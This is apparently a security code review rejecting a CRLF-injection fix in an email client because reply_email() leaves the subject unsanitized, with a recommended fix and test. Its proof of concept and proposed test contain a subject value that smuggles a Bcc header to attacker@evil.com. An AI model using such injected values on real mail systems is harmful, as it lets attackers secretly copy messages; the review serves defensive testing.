# Functional Review: H4 - Add CRLF Injection Protection

**Task**: H4: Add CRLF injection protection
**Location**: `smtp/client.py:159-197`
**Reviewer**: Functional Analyst
**Date**: 2026-04-30
**Status**: REJECTED - Critical gap identified

---

## Executive Summary

The implementation partially meets the acceptance criteria but contains a **critical security vulnerability**: the `subject` parameter in `reply_email()` is NOT sanitized, allowing direct CRLF injection attacks.

---

## Acceptance Criteria Evaluation

| Criteria | Status | Evidence |
|----------|--------|----------|
| Sanitize header values to prevent CRLF injection attacks | **PARTIAL** | See detailed analysis below |

---

## Detailed Analysis

### What Was Implemented

1. **`src/email_mcp/safety/sanitize.py`** - New sanitization module:
   - `sanitize_message_id()` - Validates RFC 5322 Message-ID format, rejects CRLF
   - `sanitize_references()` - Validates list of Message-IDs
   - `sanitize_header_value()` - Generic header sanitization (unused)
   - `sanitize_subject()` - Subject line sanitization

2. **`src/email_mcp/smtp/client.py`** - Updates:
   - `validate_email()` - Rejects CR/LF in email addresses
   - `send_email()` - Sanitizes subject (line 76)
   - `reply_email()` - Sanitizes `in_reply_to` and `references` (lines 154-155)

### Attack Vector Coverage

| Header | `send_email()` | `reply_email()` | Status |
|--------|----------------|-----------------|--------|
| Subject | SANITIZED (line 76) | **NOT SANITIZED** (line 166) | VULNERABLE |
| To/Cc/Bcc | VALIDATED | VALIDATED | Covered |
| In-Reply-To | N/A | SANITIZED (line 154) | Covered |
| References | N/A | SANITIZED (line 155) | Covered |
| From | Trusted (config) | Trusted (config) | Covered |

### Critical Vulnerability: `reply_email()` Subject Injection

**Location**: `smtp/client.py:166`

```python
msg["Subject"] = subject  # Raw subject used without sanitization!
```

**Proof of Concept**:
```python
# An attacker could call reply_email with:
in_reply_to = "<valid@message.id>"
subject = "Re: Normal\r\nBcc: attacker@evil.com\r\nX-Injected: malicious"

# This would inject:
# Subject: Re: Normal
# Bcc: attacker@evil.com
# X-Injected: malicious
```

**Impact**:
- Arbitrary header injection (Bcc, CC, custom headers)
- Potential email content manipulation
- Recipient whitelist bypass via Bcc injection

---

## Test Coverage Analysis

### Existing Tests (PASS)

- `TestSanitizeMessageId` - 10 tests
- `TestSanitizeReferences` - 5 tests
- `TestSanitizeHeaderValue` - 6 tests
- `TestSanitizeSubject` - 8 tests
- `TestReplyEmailCRLFInjection` - 9 tests (in_reply_to, references)
- `TestSendEmailCRLFInjection` - 7 tests (send_email subject)
- `TestValidateEmailCRLFProtection` - 4 tests (email addresses)

### Missing Tests

- **No test for `reply_email()` subject sanitization**
- The `TestReplyEmailCRLFInjection` class only tests `in_reply_to` and `references`

---

## Error Handling Review

The sanitization functions raise `ValueError` with descriptive messages:

| Function | Error Handling | Correctness |
|----------|---------------|-------------|
| `sanitize_message_id()` | Raises `ValueError` for empty, newlines, invalid format | Correct |
| `sanitize_references()` | Propagates `ValueError` from `sanitize_message_id()` | Correct |
| `sanitize_subject()` | Raises `ValueError` for empty or whitespace-only | Correct |
| `validate_email()` | Raises `ValueError` for invalid format or newlines | Correct |

---

## Additional Observations

1. **Unused Function**: `sanitize_header_value()` is defined but never imported or used. Consider removing or documenting its intended use case.

2. **Attachment Filename**: In `_add_attachments()` (line 250), the filename from `os.path.basename()` is used in a quoted header without sanitization. This is a lower-priority issue requiring filesystem access.

---

## Recommendation

**REJECT** - The implementation has a critical gap that violates the acceptance criteria.

### Required Fix

Add subject sanitization to `reply_email()`:

```python
# In reply_email(), line 166, change:
msg["Subject"] = subject

# To:
msg["Subject"] = sanitize_subject(subject)
```

### Required Tests

Add to `TestReplyEmailCRLFInjection`:
```python
async def test_reply_email_sanitizes_crlf_in_subject(self, mock_account):
    """reply_email should sanitize subject for CRLF injection."""
    client = SMTPClient(mock_account)

    with patch("email_mcp.smtp.client.aiosmtplib.send") as mock_send:
        mock_send.return_value = (None, "OK")

        result = await client.reply_email(
            to="user@test.com",
            subject="Re: Test\r\nBcc: attacker@evil.com",
            body="Reply body",
            in_reply_to="<msg@id>",
        )

        assert result["status"] == "sent"
        # Verify the message subject was sanitized
        call_args = mock_send.call_args
        sent_msg = call_args[0][0]
        assert "\r" not in sent_msg["Subject"]
        assert "\n" not in sent_msg["Subject"]
```

---

## Conclusion

The sanitization module is well-designed with comprehensive unit tests. However, the integration into `reply_email()` is incomplete - the subject parameter bypasses sanitization entirely. This is a direct security vulnerability that must be fixed before the task can be approved.